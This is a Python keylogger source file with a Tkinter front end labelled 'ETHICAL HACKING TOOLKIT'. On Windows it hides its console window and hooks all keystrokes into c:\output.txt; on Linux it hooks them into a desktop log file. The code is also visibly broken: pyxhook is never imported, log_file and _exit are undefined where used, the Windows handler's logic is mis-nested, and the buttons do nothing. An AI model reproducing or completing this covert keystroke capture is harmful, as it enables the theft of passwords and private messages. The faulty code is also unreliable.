from tkinter import *
import re, uuid 
from sys import platform
import webbrowser
import os

# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook

# Python code for keylogger 
# to be used in linux

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key)) 


def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
        if event.Ascii !=0 or 8:
            #open output.txt to read current keystrokes
            f = open('c:\output.txt', 'r+')
            buffer = f.read()
            f.close() 
            # open output.txt to write current + new keystrokes
            f = open('c:\output.txt', 'w')
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '/n'
                buffer += keylogs 
                f.write(buffer) 
                f.close() 

def logger():
    if platform == "linux" or platform == "linux2":      
        # This tells the keylogger where the log file will go. 
        # You can set the file path as an environment variable ('pylogger_file'), 
        # or use the default ~/Desktop/file.log 
        log_file = os.environ.get( 
            'pylogger_file', 
            os.path.expanduser('~/Desktop/file.log') 
        ) 
        # Allow setting the cancel key from environment args, Default: ` 
        cancel_key = ord( 
            os.environ.get( 
                'pylogger_cancel', 
                '`'
            )[0] 
        ) 
          
        # Allow clearing the log file on start, if pylogger_clean is defined. 
        if os.environ.get('pylogger_clean', None) is not None: 
            try: 
                os.remove(log_file) 
            except EnvironmentError: 
               # File does not exist, or no permissions. 
                pass
          
        #creating key pressing event and saving it into log file 
        
          
        # create a hook manager object 
        new_hook = pyxhook.HookManager() 
        new_hook.KeyDown = OnKeyPress 
        # set the hook 
        new_hook.HookKeyboard() 
        try: 
            new_hook.start()         # start the hook 
        except KeyboardInterrupt: 
            # User cancelled from command line. 
            pass
        except Exception as ex: 
            # Write exceptions to the log file, for analysis later. 
            msg = 'Error while catching events:\n  {}'.format(ex) 
            pyxhook.print_err(msg) 
            with open(log_file, 'a') as f: 
                f.write('\n{}'.format(msg)) 
        
    elif platform == "win32":
        win = win32console.GetConsoleWindow() 
        win32gui.ShowWindow(win, 0) 

        # create a hook manager object 
        hm = pyHook.HookManager() 
        hm.KeyDown = OnKeyboardEvent 
        # set the hook 
        hm.HookKeyboard() 
        # wait forever 
        pythoncom.PumpMessages()



root = Tk()
root.title('ETHICAL HACKING TOOLKIT')
root.geometry('{}x{}'.format(820,650))

frame_top    = Frame(root, width=800, height=120, bg="#154e72")
title = Label(frame_top,text="KEYLOGGER",fg="red")
title.config(font=("Courier bold", 34))

frame_center  = Frame(root, width=790, height=840, bg="#9dc8e3")
b1=Button(frame_center, height=1, width=50, padx=10, pady=10, text="  ON  ",cursor="hand2")
b2=Button(frame_center, height=1, width=50, padx=10, pady=10, text="  OFF  ",cursor="hand2")
T = Text(frame_center, height=15, width=45)
#T1 = Text(frame_center, height=2, width=35)
#Entry(frame_center, justify='center')
#L = Label(frame_center,text="CURRENT MAC ADDRESS",fg="red")
#cm=currentmac()
#T1.insert(END,cm)
#b3=Button(frame_center, height=1, width=30, padx=10, pady=10, text="RESET MAC TO ORIGINAL",cursor="hand2")

frame_center.grid_rowconfigure(1,weight=1)
frame_center.grid_columnconfigure(0,weight=1)


frame_bottom = Frame(root, width=800, height=50,  bg="#154e72")

title.pack()
b1.grid(row=0,sticky="n",padx=80,pady=30)
b2.grid(row=1,column=0,sticky="e",padx=80, pady=30)
T.grid(column=1,rowspan=2,sticky="e",padx=80, pady=30)
#L.grid(row=2,columnspan=2,sticky="s",padx=80)
#T1.grid(row=3,columnspan=2,sticky="s",pady=30)
#b3.grid(row=4,columnspan=2,sticky="s",pady=30)


root.grid_rowconfigure(1,weight=1)
root.grid_columnconfigure(0,weight=1)

frame_top.grid  (row=0,sticky="ew")

frame_center.grid(row=1)
frame_bottom.grid(row=2,sticky="ew")

label_1 = Label(frame_bottom, text="contribute to project",bg="white",fg="blue",cursor="hand2")
label_1.config(font=("Courier bold", 10))
label_1.bind("<Button-1>", lambda event: webbrowser.open("https://github.com/sampathbhargav/toolkit.git"))

frame_top.grid_rowconfigure(1,weight=1)
frame_top.grid_columnconfigure(0,weight=1)

label_1.pack()

root.mainloop()
